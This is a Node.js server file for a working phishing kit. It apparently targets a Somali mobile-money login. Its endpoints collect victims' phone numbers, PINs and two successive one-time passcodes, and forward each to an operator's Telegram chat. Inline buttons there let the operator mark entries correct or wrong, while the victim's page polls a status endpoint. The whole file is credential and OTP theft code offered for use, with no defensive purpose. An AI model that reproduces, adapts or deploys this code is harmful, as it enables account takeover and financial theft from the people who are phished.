const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) =>
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
);

app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api'))
        return res.status(404).send("Not found");

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), err => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    if (!phone || !pin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🇸🇴 <b>Somalia</b>
📱 <b>Phone:</b> ${phone}
🔢 <b>PIN:</b> ${pin}

━━━━━━━━━━━━━━━

⚠️ <b>Waiting for approval...</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve_${phone}_${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny_${phone}_${pin}` }
                    ]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- FIRST OTP --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `1️⃣ <b>FIRST OTP</b>\n📱 ${phone}\n🔐 ${otp}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp1_correct_${phone}_${otp}` },
                        { text: "❌ Wrong", callback_data: `otp1_wrong_${phone}` }
                    ]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- SECOND OTP --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `2️⃣ <b>SECOND OTP</b>\n📱 ${phone}\n🔐 ${otp}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct_${phone}_${otp}` },
                        { text: "❌ Wrong", callback_data: `otp2_wrong_${phone}` },
                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin_${phone}` }
                    ]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTION HELPER --------------------
async function safeEdit(ctx) {
    try {
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    } catch {}
}

// -------------------- BOT ACTIONS --------------------

// LOGIN APPROVE
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "approved";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Allowed");
    } catch {}
});

// LOGIN DENY
bot.action(/deny_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "denied";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Rejected");
    } catch {}
});

// OTP1
bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "otp1_correct";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`✅ <b>OTP1 VERIFIED</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("OK");
    } catch {}
});

bot.action(/otp1_wrong_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "otp1_wrong";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`❌ <b>OTP1 WRONG</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Retry");
    } catch {}
});

// OTP2
bot.action(/otp2_correct_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "otp2_correct";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`✅ <b>OTP2 VERIFIED</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Done");
    } catch {}
});

bot.action(/otp2_wrong_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "otp2_wrong";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`❌ <b>OTP2 WRONG</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Retry");
    } catch {}
});

bot.action(/otp2_wrongpin_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        statusStore[phone] = "otp2_wrongpin";

        await safeEdit(ctx);
        await ctx.replyWithHTML(`🔑 <b>WRONG PIN</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("PIN");
    } catch {}
});

// -------------------- STATUS --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    return res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START --------------------
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

(async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
})();
